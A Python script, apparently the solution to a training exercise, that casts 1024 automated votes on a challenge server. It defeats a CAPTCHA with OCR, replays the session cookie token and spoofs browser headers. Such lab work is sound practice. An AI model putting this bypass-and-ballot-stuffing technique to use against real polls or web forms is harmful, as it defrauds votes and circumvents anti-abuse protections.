#!/usr/bin/python3
"""module requests hodor"""
import requests
import pytesseract
from io import BytesIO
try:
    import Image
except ImportError:
    from PIL import Image


url = "http://158.69.76.135/level3.php"
ulr_cap = "http://158.69.76.135/captcha.php"

images_c = requests.get(ulr_cap).content
img_png = Image.open(BytesIO(images_c))
captcha_img = pytesseract.image_to_string(img_png)

header = {'Referer': url,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
            AppleWebKit/537.36 (KHTML, like Gsecko)\
            Chrome/83.0.4103.61 Safari/537.36'}

votos = 0
while votos < 1024:
    response = requests.get(url)
    key_HoldTheDoor = response.cookies["HoldTheDoor"]
    params = {'id': '1729', 'holdthedoor': 'submit',
              'key': key_HoldTheDoor, 'captcha': captcha_img}
    cookies_hodor = {"HoldTheDoor": key_HoldTheDoor}
    response = requests.post(url, data=params, headers=header,
                             cookies=cookies_hodor)
    votos += 1
    print("voto number: {}".format(votos))

print("Voting complete!")
